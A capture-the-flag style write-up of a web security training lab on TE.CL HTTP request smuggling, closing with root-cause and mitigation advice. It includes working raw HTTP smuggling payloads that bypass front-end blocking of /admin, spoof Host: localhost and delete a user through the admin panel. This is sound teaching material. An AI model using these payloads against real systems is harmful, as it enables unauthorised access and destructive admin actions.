HTTP request smuggling to bypass front-end controls 

Lab Difficulty: Practitioner
Vulnerability: HTTP request smuggling, TE.CL

Summary
There’s a front-end proxy and a back-end server. The front-end blocks access to /admin, but the back-end does not support chunked encoding. By smuggling a request through the front-end so the back-end sees a different set of bytes, you can make the back-end handle a hidden /admin request on your behalf. In this lab I smuggled a request that deleted user carlos from the admin panel. Fun little timing and formatting game — the server treats chunked bodies differently, so we trick the front-end into swallowing part of the traffic while the back-end executes our hidden request.

Steps taken (what I actually did)

Tried to visit /admin in the browser. Front-end blocked it. Nothing unexpected.

Opened Burp Repeater and made sure the automatic Content-Length update option was turned off. Manual lengths are key here.

Sent a carefully crafted request twice to prime the front-end and back-end with a smuggled payload. The first working pattern I used was this (replace YOUR-LAB-ID with the lab host):

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

60
POST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

Make sure to include the trailing CRLF CRLF after the final 0. I ran that request twice per the usual smuggling choreography.
4. Observed the merged request to /admin was rejected because the back-end wanted Host: localhost. So I adjusted the smuggled inner request to include Host: localhost. Same trick, sent it twice:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

Now the admin panel was accessible through the smuggled request. That confirmed the smuggle worked and the back-end was seeing our inner request with Host: localhost.
5. With that confirmed, I swapped the smuggled payload to a GET that deletes carlos:

POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

Send that twice as before. The back-end processed the injected GET and deleted carlos. Lab solved.

Notes and tips

The lab supports HTTP/2, but the intended exploit uses HTTP/1. If Burp decides HTTP/2, switch to HTTP/1 manually in Repeater’s Request attributes.

Manually calculating Content-Length and chunk sizes is fiddly. Turn off auto-updates. If you get weird rejections, re-check your CRLF sequences and that the chunk sizes match the payload length.

Burp’s HTTP Request Smuggler extension can help with length fixing if you want less manual pain.

Root cause
The front-end and back-end parse request bodies differently. The front-end accepts chunked encoding and the back-end does not, so by supplying a mismatch (both Transfer-Encoding: chunked and a small Content-Length) we can get the front-end to frame bytes one way while the back-end parses them as a separate embedded request. The back-end also trusts Host: localhost, so when the smuggled inner request contains that host, it treats it as a local admin request. No validation or additional checks happen server-side.

Fixes and mitigation

Ensure consistent parsing rules across front-end and back-end. If the back-end doesn’t support chunked encoding, the front-end should not accept chunked requests to proxy through.

Normalize and validate headers at the edge: drop or canonicalize Transfer-Encoding and Content-Length headers so they can’t be used in conflicting ways.

If possible, reject requests that contain both Transfer-Encoding and Content-Length in suspicious combinations.

Implement strict Host header checks and internal-only routing that ignores client-supplied Host values for internal endpoints.

Add WAF rules to detect common smuggling patterns and log/alert when they appear.
